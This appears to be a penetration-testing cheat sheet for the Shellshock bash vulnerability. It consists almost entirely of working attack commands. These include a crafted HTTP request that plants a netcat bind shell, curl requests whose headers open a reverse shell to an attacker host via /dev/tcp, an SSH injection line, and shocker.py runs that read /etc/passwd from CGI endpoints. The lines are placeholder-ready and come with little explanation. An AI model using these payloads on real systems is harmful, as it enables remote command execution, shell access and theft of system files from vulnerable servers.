### Shellshock

#### manula
- echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc [victim_ip] 80
- curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" [victim_ip]/cgi-bin/status
- curl http://[victim_ip]/path/to/cgi- bin/name_of_vuln_cgi -H "custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 "

#### shellshock via SSH
- ssh username@$[victim_ip] '() { :;}; /bin/bash'

#### tool
***shocker*** ttps://github.com/nccgroup/shocker 
- ./shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose